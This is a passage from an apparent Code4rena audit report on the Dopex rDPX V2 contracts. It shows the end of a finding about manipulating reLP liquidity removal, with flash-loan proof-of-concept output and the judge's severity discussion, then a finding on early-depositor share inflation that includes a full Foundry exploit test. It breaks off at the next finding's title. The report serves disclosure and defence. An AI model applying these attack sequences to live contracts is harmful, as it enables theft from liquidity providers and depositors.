href=\"https://gist.github.com/peakbolt/f2d9a44714b1a2a693debea737128696\">here</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> --------------  setup copied from testReLpContract() ------------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  -------------- 1. attacker perform first swap to get rDPX with flashloaned WETH ------------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker weth balance (initial) : 10000000000000000000000 [from flashloan]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker rdpx balance (initial) : 0 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker weth balance (after 1st swap): 0 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker rdpx balance (after 1st swap): 33799781371440793668463</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  rDPX price in WETH (after 1st swap): 435429977934145959 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  -------------- 2. Attacker triggers bond() that indirectly perform removeLiquidity() in reLPContract.reLP() ------------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  rDPX price in WETH (after bond): 440827346696573406 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  -------------- 3. Attacker performs 2nd swap rDPX back to WETH and profit ------------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker weth balance (after 2nd swap): 10042795347724107931994 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker rdpx balance (after 2nd swap): 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker profit in WETH (after repaying flashloan): 42795347724107931994</span></span></code></pre>\n<p><strong>2. Cost of imbalancing</strong>\nThere are 3 main attack cost implicitly mentioned in the original submission. Based on the POC, they are ~11 ETH, minimal as compared to the 42.79 ETH profit.</p>\n<ul>\n<li>Flash loan cost - as mentioned, use of flash loan for WETH in POC. If we take Aave as a reference, flash loan fee is 0.09% of flash loan amount, which will be 9 ETH based on POC, lower than the 42.79 ETH profit.</li>\n<li>Gas cost - as mentioned this attack does not involve mempool to frontrun, so attacker does not need to pay high gas fee.</li>\n<li>Bonding cost - obviously rDPX and ETH are required to trigger bond(), this is negligible as it can be recouped by redeeming/selling the bonded dpxETH. If we take Aave ETH borrow cost at a conservative 2% APY for 1e20 dpxETH bonding amount, that will be 2 ETH, which is even lower than flash loan fee.</li>\n</ul>\n<p><strong>3. Control over amount of LP tokens to remove</strong>\nAs mentioned in my submission, in this case, the attacker has control of the trade size of removeLiquidity() via bond() amount. By increasing the bond amount, which increase amount of LP tokens to remove, the attacker can increase the profitability of the attack.</p>\n<p><strong>4. During the bootstrap phase, majority of LP holders are dopex funds/partners</strong>\nThe docs stated that during bootstrap phase, Dopex Treasury funds and Partners will partake in the dpxETH bonding first to ensure sufficient dpxETH in circulation. In addition, the backing reserve will be used to seed the liquidity for the Uniswap V2 Pool. So during that period, there are little other LP holders. I did not state this in submission as it is already in the docs.<br>\n<a href=\"https://dopex.notion.site/rDPX-V2-RI-b45b5b402af54bcab758d62fb7c69cb4\">https://dopex.notion.site/rDPX-V2-RI-b45b5b402af54bcab758d62fb7c69cb4</a> (see Launch Details)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1778702756\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>@peakbolt </p>\n<ul>\n<li>What’s the value in Pool?</li>\n<li>Can you repeat the attack more than once?</li>\n<li>What’s the profit / value drained per iteration?</li>\n<li>What’s the threshold of TVL before the attack is profitable given 30BPS swap fees?</li>\n</ul>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1779856524\">peakbolt (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @Alex the Entreprenerd, </p>\n<p>I have adjusted the POC to a liquidity pool value of ~800 ETH with flashloan attack amount of 15e20 and ran it to provide the answers below. Used 800ETH TVL as the assumed amount to bootstrap, judging by the lower range of TVL in the top uniswap pools. Note that the initial TVL value in the test suite is actually 4000 ETH.<br>\nSee link for updated poc: <a href=\"https://gist.github.com/peakbolt/a8fdbe18759ac2e25d15716af6faa76b\">https://gist.github.com/peakbolt/a8fdbe18759ac2e25d15716af6faa76b</a>.</p>\n<ol>\n<li>Yes, it is possible to repeat the attack more than once by bonding multiple times to trigger consecutive removal of liquidity after imbalancing the pool. </li>\n<li>Printout for the updated poc below, shows an attack with 5 <code>bond()</code> iterations. </li>\n<li>Beyond 5 <code>bond()</code> will hit a revert as there will be insufficient WETH collateral in <code>PerpetualAltanticVault</code> for purchase of put options (during bonding). </li>\n<li>The attacker can workaround that by waiting for users to deposit more WETH into PerpetualAltanticVault before carrying out the attack.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  Total Liquidity (in WETH) for RDPX/WETH UniswapV2 Pool (before attack): 804803971980485176292 </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker weth balance (initial) : 1500000000000000000000 [from flashloan]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker rdpx balance (initial) : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bond() Iteration 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bond() Iteration 2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bond() Iteration 3</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bond() Iteration 4</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bond() Iteration 5</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  attacker profit in WETH (after repaying flashloan): 22067892940781745930</span></span></code></pre>\n<ol start=\"2\">\n<li>Based on the poc (~800ETH TVL), the attack with 5 iterations will gain ~22 ETH (inclusive of swap fees as shown in POC using Arb mainnet fork). </li>\n<li>For 800 ETH TVL, the flash loan cost for attack is lower at 1.35 ETH (0.09% of 15e20 ETH)</li>\n<li>After flash loan cost profit will be 22-1.35 = 20.65 ETH</li>\n<li>That works out to be 20.65/800 ETH = ~2.58% profit/TVL. </li>\n<li>Per iteration will be 0.516% profit/TVL.</li>\n<li>For bonding, it will require upfront capital of 1e20 WETH/iteration to bond the dpxETH, which can be recouped by selling the dpxETH later on. To keep it simple, I have omitted the loan cost for this and assume attacker has the capital. Otherwise, attacker can get a loan and reduces attack profit. </li>\n<li>As for the TVL threshold, I have tried lower TVL at 400 ETH and attack is still viable, with a profit 11.32 ETH (12.04 ETH - flash loan cost of 0.72 ETH). Did not try lower as I assume protocol will not bootstrap lower than that. Though profit is still possible to a certain extent, but likely insignificant.</li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1781331660\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The finding shows that the attacker has access to the “button”, this allows them to cause the contract to auto-rebalance.</p>\n<p>The auto-rebalancing is part of the “button” that attack can trigger.</p>\n<p>Initially I believed that the attacker only had control over the amounts from remove liquidity, which by definition will give pro-rata of the tokens.</p>\n<p>The pro-rata can be manipulated based on attacking the <code>X * Y = k</code> uniswap invariant to have the contract take a loss that is relative to the new spot balance, vs the fair LP pricing.</p>\n<p>That was Medium Severity imo and most Judges would agree with me, however, after talking with 2 more judges, we agreed that the code also impacts the rebalancing, done via <code>swapExactTokensForTokens</code> meaning that the attacker is not only causing the “skimmin” of the LP token value, they are able to influence the swap via <code>swapExactTokensForTokens</code>.</p>\n<p>However, upon further inspection, that is protected by the Oracle Pricing, which could be argued to protect against it.</p>\n<p>That said, the default slippage protection is 50 BPS, which is above the 30BPS avg cost of a swap on UnIV2, the oracles also can have drift which in general should make the cost of backrunning sustainable.</p>\n<p>The profit of the attack would come due to:\n-> Swap taking a Loss -> generally seen as Med but since it’s repeatable High is acceptable\n-> Ability to trigger the Withdrawal at any time, which causes the Pro-Rata received <code>X * Y</code> being less valuable than the fair valuation of the LP Token.</p>\n<p>This means that under most circumnstances, a risk free trade is available for attacker at the detriment of the <code>reLP</code> contract, leading me to believe High Severity to be appropriate.</p>\n<p>However, given the circumnstances, and given the original submission did not contain the POC, also considering that the POC shows an impact of 2% of funds, I’m maintaining Medium Severity due to the POC not being present in the original submission.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09--a-malicious-early-depositor-can-manipulate-the-lp-token-price-per-share-to-take-an-unfair-share-of-future-user-deposits-\" style=\"position:relative;\"><a href=\"#m-09--a-malicious-early-depositor-can-manipulate-the-lp-token-price-per-share-to-take-an-unfair-share-of-future-user-deposits-\" aria-label=\"m 09  a malicious early depositor can manipulate the lp token price per share to take an unfair share of future user deposits  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/863\">[M-09]  A malicious early depositor can manipulate the <code>LP-Token</code> price per share to take an unfair share of future user deposits </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/863\">0xWagmi</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2230\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1947\">vangrim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1877\">catellatech</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1516\">MohammedRizwan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1319\">Hama</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1263\">836541</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1223\">okolicodes</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1207\">Inspecktor</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/908\">erebus</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/907\">GangsOfBrahmin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/894\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/698\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/615\">ravikiranweb3</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/531\">zaevlad</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/461\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/400\">niki</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/573\">IceBear</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L283\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L283</a></p>\n<p>A  malicious early depositor can profit from future depositors’ deposits. While the late depositors will lose part of their funds to the attacker.</p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Details</h3>\n<p>The first depositor can buy a small number of shares and next he should wait until   owner  settle an options through <code>RdpxCore</code> so it will result in calling <code>addRDPX</code> in <code>PerpetualAtlanticVaultLP</code> by transfering rdpxTokens into it and updating <code>_rdpxCollateral</code>, as <code>rdpx Token</code> has 18 decimals <code>https://arbiscan.io/token/0x32eb7902d4134bf98a28b963d26de779af92a212</code> even small amount of rdpx token result in giving a higher <code>totalVaultCollateral()</code> so then it calculates <code>assets.mulDivDown(supply,totalVaultCollateral);</code> , then it  will make shares very expensive for the next depositors,</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p><code>copy this test into /tests/perp-vault/Integration.t.sol</code><br>\n<code>forge test --match-path ./tests/perp-vault/Integration.t.sol -vvvv</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_second_user_loss_share</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">//=============================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\">  </span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">  = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Hecer&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\">  </span><span class=\"mtk12\">investor</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;investor&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">//=============================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk11\">setApprovals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk11\">setApprovals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">investor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mintWeth</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wei</span><span class=\"mtk1\">, </span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// hecker starts with 1 wei 🐱‍👤</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mintWeth</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">investor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH Balance Of attacker before &quot;</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">));          </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RDPX Balance Of attacker before &quot;</span><span class=\"mtk1\"> ,</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wei</span><span class=\"mtk1\">, </span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//===============================================================================================================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/* This step isn&#39;t possible like this owner should call  `settle` in RdpxV2Core , but for the simplicity lets say</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">        10 rdpx tokens transfered into vaultLP   after hecer deposit 1 wei of weth and get 1 share </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">    */</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">),</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">),</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// 10 tokens because rpdx 18 decimals // 0x32eb7902d4134bf98a28b963d26de779af92a212 </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRdpx</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//===============================================================================================================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//   Then the investor deposits  20 ether </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk12\">investor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userBalance2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">investor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Lp-balance Of attacker : %s share &quot;</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">userBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Lp-balance Of investor : %s share &quot;</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">userBalance2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk3\">// (uint asset , uint rdpxA)= vaultLp.redeemPreview(uint256(1));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">),</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">,</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WETH Balance Of attacker after&quot;</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">));  </span><span class=\"mtk3\">//Starting with 1wei attacker🐱‍👤 endUp with 2 wrapped ether ;    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;RDPX Balance Of attacker after&quot;</span><span class=\"mtk1\"> ,</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hecer</span><span class=\"mtk1\">));        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools used</h3>\n<p> Foundry</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider requiring a minimal amount of share tokens to be minted for the first minter</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1734043995\">witherblock (Dopex) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We have planned to be the first depositors for this vault to prevent this issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1759179100\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Given the fact that:</p>\n<ul>\n<li>Rebase is possible (good old ERC4626 attack)</li>\n<li>Impact is existant</li>\n<li>Deployment is Permissioned</li>\n</ul>\n<p>Medium severity seems appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-change-of-fundingduration-causes-time-travel-of-perpetualatlanticvaultnextfundingpaymenttimestamp\" style=\"position:relative;\"><a href=\"#m-10-change-of-fundingduration-causes-time-travel-of-perpetualatlanticvaultnextfundingpaymenttimestamp\" aria-label=\"m 10 change of fundingduration causes time travel of perpetualatlanticvaultnextfundingpaymenttimestamp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/850\">[M-10] Change of <code>fundingDuration</code> causes “time travel” of 